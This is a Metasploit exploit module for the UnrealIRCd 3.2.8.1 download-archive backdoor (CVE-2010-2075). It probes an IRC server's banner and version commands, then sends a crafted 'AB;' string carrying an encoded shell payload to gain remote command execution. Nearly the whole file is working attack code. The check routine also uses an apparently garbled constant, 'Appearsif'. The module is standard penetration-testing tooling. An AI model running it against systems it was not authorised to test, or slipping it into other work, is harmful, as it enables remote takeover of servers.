##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'UnrealIRCD 3.2.8.1 Backdoor Command Execution',
        'Description' => %q{
          This module exploits a malicious backdoor that was added to the
          Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the
          Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.
        },
        'Author' => [ 'hdm' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2010-2075' ],
          [ 'OSVDB', '65445' ],
          [ 'URL', 'http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt' ]
        ],
        'Platform' => ['unix'],
        'Arch' => ARCH_CMD,
        'Privileged' => false,
        'Payload' => {
          'Space' => 1024,
          'DisableNops' => true,
          'Compat' =>
                        {
                          'PayloadType' => 'cmd',
                          'RequiredCmd' => 'generic perl ruby telnet',
                        }
        },
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2010-06-12',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(6667)
      ]
    )
  end

  def check_irc_command(cmd)
    vprint_status("Checking #{cmd}")
    sock.put("#{cmd}\n")
    r = sock.get_once(-1, 10).to_s
    r.to_s.split("\n").each do |line|
      vprint_line("    #{line}")
    end
    return Exploit::CheckCode::Vulnerable if r.downcase.include?("unreal3.2.8.1")
    return Exploit::CheckCode::Appearsif if r.downcase.include?("unreal")
  end

  def check
    vprint_status("Connecting to IRC service")
    connect
    print_status("Connected to #{rhost}:#{rport}")

    vprint_status("Checking IRC banner")
    banner = sock.get_once(-1, 10).to_s
    banner.to_s.split("\n").each do |line|
      vprint_line("    #{line}")
    end
    return Exploit::CheckCode::Vulnerable if banner.downcase.include?("unreal3.2.8.1")
    return Exploit::CheckCode::Appearsif if banner.downcase.include?("unreal")

    irc_user = rand_text_alpha(6).downcase
    vprint_status("Trying to register a new IRC user: #{irc_user}")
    sock.put("NICK #{irc_user}\n")
    # Not checking for PING/PONG
    sock.put("USER #{irc_user} 0 * #{irc_user}\n")
    register = sock.get_once(-1, 10).to_s
    register.to_s.split("\n").each do |line|
      vprint_line("    #{line}")
    end
    return Exploit::CheckCode::Vulnerable if register.downcase.include?("unreal3.2.8.1")
    return Exploit::CheckCode::Appearsif if register.downcase.include?("unreal")

    check_irc_command("VERSION")
    check_irc_command("INFO")
    check_irc_command("CREDITS")
    check_irc_command("MOTD") # May not have a value
    check_irc_command("BOTMOTD") # May not have a value
    check_irc_command("HELP") # May not give version
    #check_irc_command("MAP") # hostname
    #check_irc_command("LINKS") # hostname
    #check_irc_command("TIME") # ...enum
    #check_irc_command("RULES") # ...enum
    #check_irc_command("ADMIN") # hostname
    check_irc_command("LICENSE") # Service name

    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    print_status("Connected to #{rhost}:#{rport}...")
    banner = sock.get_once(-1, 30)
    banner.to_s.split("\n").each do |line|
      print_line("    #{line}")
    end

    print_status("Sending backdoor command...")
    sock.put("AB;" + payload.encoded + "\n")

    # Wait for the request to be handled
    1.upto(120) do
      break if session_created?

      select(nil, nil, nil, 0.25)
      handler()
    end
    disconnect
  end
end
